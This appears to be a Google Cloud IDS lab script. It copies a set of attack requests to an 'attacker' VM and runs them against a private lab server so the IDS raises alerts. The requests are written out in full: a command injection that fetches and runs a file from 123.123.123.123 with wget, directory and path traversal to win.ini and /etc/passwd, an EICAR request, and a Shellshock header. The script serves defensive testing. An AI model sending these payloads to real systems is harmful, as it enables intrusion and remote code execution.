#!/bin/bash

# Attack Simulation Script
# Simulates various attack patterns to trigger Cloud IDS alerts

set -e

# Colors for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m'

print_status() {
    echo -e "${BLUE}[INFO]${NC} $1"
}

print_success() {
    echo -e "${GREEN}[SUCCESS]${NC} $1"
}

print_warning() {
    echo -e "${YELLOW}[WARNING]${NC} $1"
}

print_error() {
    echo -e "${RED}[ERROR]${NC} $1"
}

# Set project ID
export PROJECT_ID=$(gcloud config get-value project 2>/dev/null | sed '2d')

if [ -z "$PROJECT_ID" ]; then
    print_error "No project ID found. Please set your project with: gcloud config set project YOUR_PROJECT_ID"
    exit 1
fi

print_status "Starting attack simulation from attacker VM..."

# Check if attacker VM exists
if ! gcloud compute instances describe attacker --zone=us-east1-b --project=$PROJECT_ID >/dev/null 2>&1; then
    print_error "Attacker VM not found. Please run the main setup script first."
    exit 1
fi

# Create attack script to run on attacker VM
cat > /tmp/attack-commands.sh << 'EOF'
#!/bin/bash

echo "Starting attack simulation..."
echo "Target server: 192.168.10.20"
echo ""

# Test basic connectivity first
echo "Testing basic connectivity..."
if curl -s -I http://192.168.10.20 | head -1; then
    echo "✓ Server is reachable"
else
    echo "✗ Server is not reachable"
    exit 1
fi

echo ""
echo "Running attack simulations..."
echo "============================="

# Low Severity Attack
echo ""
echo "[1/5] Low Severity: SQL Injection with Command Execution"
curl -s "http://192.168.10.20/weblogin.cgi?username=admin';cd /tmp;wget http://123.123.123.123/evil;sh evil;rm evil" || true
echo "✓ Low severity attack completed"

sleep 2

# Medium Severity Attacks
echo ""
echo "[2/5] Medium Severity: Directory Traversal"
curl -s "http://192.168.10.20/?item=../../../../WINNT/win.ini" || true
echo "✓ Directory traversal attack completed"

sleep 2

echo ""
echo "[3/5] Medium Severity: EICAR Test File Access"
curl -s "http://192.168.10.20/eicar.file" || true
echo "✓ EICAR test file access completed"

sleep 2

# High Severity Attack
echo ""
echo "[4/5] High Severity: Path Traversal to System Files"
curl -s "http://192.168.10.20/cgi-bin/../../../..//bin/cat%20/etc/passwd" || true
echo "✓ High severity attack completed"

sleep 2

# Critical Severity Attack
echo ""
echo "[5/5] Critical Severity: Shellshock Vulnerability"
curl -s -H 'User-Agent: () { :; }; 123.123.123.123:9999' "http://192.168.10.20/cgi-bin/test-critical" || true
echo "✓ Critical severity attack completed"

echo ""
echo "All attack simulations completed!"
echo "Check Cloud IDS console in a few minutes to see the detected threats."
EOF

# Copy attack script to attacker VM
print_status "Copying attack script to attacker VM..."
gcloud compute scp /tmp/attack-commands.sh attacker:/tmp/attack-commands.sh --zone=us-east1-b --tunnel-through-iap --project=$PROJECT_ID

# Execute attacks from attacker VM
print_status "Executing attacks from attacker VM..."
print_warning "This will simulate various attack patterns that should trigger IDS alerts"

gcloud compute ssh attacker --zone=us-east1-b --tunnel-through-iap --project=$PROJECT_ID --command="chmod +x /tmp/attack-commands.sh && /tmp/attack-commands.sh"

# Clean up
rm -f /tmp/attack-commands.sh

print_success "Attack simulation completed!"
echo ""
print_status "What happens next:"
echo "1. Wait 2-5 minutes for Cloud IDS to process the traffic"
echo "2. Go to Google Cloud Console > Network Security > Cloud IDS"
echo "3. Click on the 'Threats' tab to view detected threats"
echo "4. Click 'More' > 'View threat details' for detailed analysis"
echo "5. Click 'More' > 'View threat logs' to see logs in Cloud Logging"
echo ""
print_status "Expected threat types to see:"
echo "• Low Severity: Command injection attempts"
echo "• Medium Severity: Directory traversal, malware detection"
echo "• High Severity: System file access attempts"
echo "• Critical Severity: Remote code execution vulnerabilities"
echo ""
print_warning "If you don't see threats immediately,